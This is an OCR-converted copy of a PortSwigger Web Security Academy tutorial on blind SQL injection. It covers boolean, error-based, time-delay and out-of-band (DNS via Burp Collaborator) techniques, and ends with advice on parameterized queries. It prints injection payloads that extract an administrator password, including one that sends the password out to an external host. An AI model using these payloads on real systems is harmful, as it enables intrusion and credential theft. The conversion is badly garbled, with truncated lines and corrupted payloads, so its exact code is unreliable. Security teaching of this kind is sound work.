# What is Blind SQL Injection_ Tutorial & Examples

> Converted source material; attribution: PortSwigger Web Security Academy. Snapshot processed 2026-10-27.
> Source SHA-256: `861ac58c25e12e83542ec97bdf478d858880d7a649b8ba4a4912b808c524885d`.
> Conversion: Local English OCR, all 5 text segments. Source opinions and historical examples are preserved, not automatically endorsed.
> OCR literals, payloads, and complex table alignment are not character-verified throughout. Use the curated guidance and exact-text sources for implementation; do not execute OCR examples without checking the publisher.


Blind

SQL injection

## What is blind SQL injection?

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results c Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on be access unauthorized data, but different techniques must be used.

## Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie Cookie: TrackingId=u5YD3PapBcR41N3e7Tj4

When a request containing a Trackingld cookie is processed, the application uses a SQL query to determine whether this is e

```text
SELECT Tracking ld FROM TrackedUsers WHERE Tracking ld
```

' u5YD3PapBcR41N3e7Tj4 '

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application doe data and you receive a "Welcome back" message in the response. This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering differe To understand how this exploit works, suppose that two requests are sent containing the following Tracking ld cookie values ir ...xyz' AND '1'='1 ...xyz' AND '1'='2

- The first of these values causes the query to return results, because the injected AND I condition is true. As a result

- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" m

This allows us to determine the answer to any single injected condition, and extract data one piece at a time. For example, suppose there is a table called Users with the columns Username and Password , and a user called Adminis To do this, start with the following input: xyz' AND SUBSTRING( (SELECT Password FROM Users WHERE Username - ' Administrator'),

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password Next, we send the following input: xyz' AND SUBSTRING( (SELECT Password FROM Users WHERE Username - ' Administrator ' )

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the

## Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first characté€@f

---

We can continue this process to systematically determine the full password for the Administrator user.

Note The SUBSTRING function is called SUBSTR on some types of database. For more details, see the SQL injection cheat sheet

Blind SQL injection with conditional responses

## Error-based SQL injection

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from to trigger:

- You may be able to induce the application to return a specific error response based on the result of a boolean expression. Yc

Exploiting blind SQL injection by triggering conditional errors. You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind S

Exploiting blind SQL injection by triggering conditional errors Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. Th application's responses. It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can mod causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injectec To see how this works, suppose that two requests are sent containing the following Trackingld cookie values in turn: xyz' AND (SELECT CASE WHEN (1-2) THEN 1/0 ELSE 'a' END) = 'a xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a'

These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is

- With the first input, the CASE expression evaluates to ' a' , which does not cause any error.

- With the second input, it evaluates to 1/0 , which causes a divide-by-zero error.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition Using this technique, you can retrieve data by testing one character at a time: xyz' AND (SELECT CASE WHEN (Username - ' Administrator' AND SUBSTRING (Password,

Note There are different ways of triggering conditional errors, and different techniques work best on different database types. For m

Blind SQL injection with conditional errors

Extracting sensitive data via verbose SQL error messages Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be usefu parameter: Untermxnated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id

---

Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax. Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is retun You can use the CAST ( ) function to achieve this. It enables you to convert one data type to another. For example, imagine a qut CAST ( (SELECT example column FROM example _ table) AS int) Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int , may ERROR: invalid input syntax for type integer: "Example data " This type of query may also be useful if a character limit prevents you from triggering conditional responses.

Visible error-based SQL injection

## Exploiting blind SQL injection by triggering time delays

If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any differc In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based c The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, IF (1=2) WAITFOR DELAY IF (1=1) WAITFOR DELAY

- The first of these inputs does not trigger a delay, because the condition 1=2 is false.

- The second input triggers a delay of 10 seconds, because the condition 1=1 is true.

Using this technique, we can retrieve data by testing one character at a time: IF (SELECT COUNT (Username) FROM Users WHERE Username Administrator AND SUBSTRING (Passw

Note There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of databas

Blind SQL injection with time delays

Blind SQL injection with time delays and information retrieval

## Exploiting blind SQL injection using out-of-band (OAST) techniques

An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to usefully, data can be exfiltrated directly within the network interaction A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many I The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input o

---

This causes the database to perform a lookup for the following domain: Oe fdymgwl 05w9 inae 8mg 4 df ay. burpcol laborator . net

You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookup

Blind SQL injection with out-of-band interaction

Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the declare @p varchar (1024) ; set @p= (SELECT password FROM users WHERE username= ' Administrator'

This input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS loc S3cure . cwcsgt0 5ikj i Onl f2qIzn5118sek2 9 . burpcollaborator . net

Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success a in situations where other techniques for blind exploitation do work.

Note There are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. Fc

Blind SQL injection with out-of-band data exfiltration

## How to prevent blind SQL injection attacks?

Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than fol As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, whi

- How to prevent SQL injection

- Find blind SQL injection vulnerabilities using Burp Suite's web vulnerability scanner

---
